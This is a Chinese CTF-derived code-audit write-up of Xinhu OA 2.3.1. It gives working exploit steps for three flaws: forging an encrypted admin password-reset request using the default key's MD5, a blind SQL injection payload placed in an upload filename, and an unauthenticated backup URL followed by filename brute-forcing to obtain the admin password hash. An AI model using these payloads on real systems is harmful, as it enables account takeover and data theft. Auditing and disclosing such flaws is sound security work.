# [代码审计]信呼OA2.3.1版本代码审计


# 前言
对于这个OA的代码审计是在最近的西湖论剑比赛中出的一个web题，题目是2.3.1版本的信呼OA，在当时是最新版的（2021.11.20）
这次比赛结束打算好好审计一波

# 环境搭建
此次代码审计我用的是2.3.1版本
项目地址：
https://xinhu-1251238447.file.myqcloud.com/file/xinhu_utf8_v2.3.1.zip

安装好后，修改admin的密码，成功初始化

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdf633e0cf3540b093b92e0eb3afcd07.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

# 漏洞分析
## 修改任意用户密码
在安装完该OA系统后，我修改了默认密码为1234qwer

漏洞存在于`webmain/task/api/reimplatAction.php`中
看到这里的代码

```php
public function indexAction()
	{
		$body = $this->getpostdata();
		if(!$body)return;
		$db 	 = m('reimplat:dept');
		$key 	 = $db->gethkey();
		$bodystr = $this->jm->strunlook($body, $key);
		if(!$bodystr)return;
	
		$data 	 = json_decode($bodystr, true);
		$msgtype = arrvalue($data,'msgtype');
		$msgevent= arrvalue($data,'msgevent');
		
============中间省略================================
		
		//修改密码
		if($msgtype=='editpass'){
			$user = arrvalue($data, 'user');
			$pass = arrvalue($data, 'pass');
			if($pass && $user){
				$where  = "`user`='$user'";
				$mima 	= md5($pass);
				m('admin')->update("`pass`='$mima',`editpass`=`editpass`+1", $where);
			}
		}
	}
```
首先是`getpostdata()`方法获取post传入的数据
第二个点就是key，我们跟进这个`getkey()`方法
在`webmain/model/reimplat/reimplat.php`中可以看到如下代码，会返回md5值
默认安装完系统这个是空的 返回的也就是空string的md5值，即d41d8cd98f00b204e9800998ecf8427e
```php
	public function gethkey()
	{
		$key = $this->reimplat_huitoken;
		if(isempt($key))$key = $this->reimplat_secret;
		if(isempt($key))$key = $this->reimplat_cnum;
		return md5($key);
	}
```
然后就是`$bodystr = $this->jm->strunlook($body, $key);`，这里对我们传入的数据进行**解密**
那么我们可以在下面构造一个**加密**，获取到修改后的sign，如下图所示

```php
$test = $this->jm->strlook(json_encode(array("msgtype"=>"editpass","user"=>"admin","pass"=>"123456")), $key);
echo $test;
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0dd21c2adc464157a9a91256c1cf0da9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

发包时还是得用post方法发包，成功拿到恶意修改的sign

![在这里插入图片描述](https://img-blog.csdnimg.cn/1815187d3ab24384a275dd862894c9aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

此时我们再把这个sign作为post数据穿进去，经过`getpostdata()`获取到data，再通过相同的key去通过`strunlook()`进行解密，从而进入判断条件
修改密码
```
$msgtype=='editpass'
```
发包如下

![在这里插入图片描述](https://img-blog.csdnimg.cn/75f56ad99204490095b12fb0d9984caa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

密码成功修改成了123456

![在这里插入图片描述](https://img-blog.csdnimg.cn/4bd411f95b0646a3b98bf0c113f97c4b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)


## 文件上传处sql盲注
需要先登录后台才能使用文件上传

`webmain/public/upload/uploadAction.php`
在upfileAjax方法里面，找到执行sql语句处，跟进uploadback方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/8eda1e6b6faa48d283f190b33b3a22d5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里有一个过滤函数，跟进看一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/7875ab291df4424294780faaecc822ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里注释说明了是过滤特殊的文件名，可以看到，这里过滤的很少

![在这里插入图片描述](https://img-blog.csdnimg.cn/3579b810fb2a46d78fd9e296f2dcd93e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

修改uptype为*，文件名为sql注入语句，可以看到成功延时
![在这里插入图片描述](https://img-blog.csdnimg.cn/46cfd111fc8b4bedaf8d2deddf6279e8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

盲注语句可以这样写，这里单独的`()`会被过滤掉，双写就可以了
```sql
1' and if(ascii(substr((select database(())),1,1))>1,SLEEP(3),0)-- -
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/16dd014707934f08a4db3ff30ec27863.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这样就可以写脚本跑内容了，这里就不多说了

## 未授权备份
在webmain/task/runt/sysAction.php中
这里用beifenClassModel调用了他的start方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/00cc3703c04a49cdb534ee609f030d65.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)

找到beifenClassModel，看到里面的start方法
会把数据库数据备份到upload/data目录下，以时间命名

![在这里插入图片描述](https://img-blog.csdnimg.cn/eed38931fa114eddacec1dc326ba9ea7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

payload：

```
/task.php?m=sys|runt&a=beifen
```

可以发现已经备份过来了

![在这里插入图片描述](https://img-blog.csdnimg.cn/fb1399d437a443ecb8ccafaebfb8b0cc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)

都是可以直接访问的，可以爆破一下文件名去拿

![在这里插入图片描述](https://img-blog.csdnimg.cn/15c16ce598bf4fcc8e67b28413a38350.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里是可以拿到管理员密码的

![在这里插入图片描述](https://img-blog.csdnimg.cn/aacfad43346e4fa6a232035f5e9bd976.png)

这个的前提是知道数据库的库名，不然还是打不了了，默认是xinhu

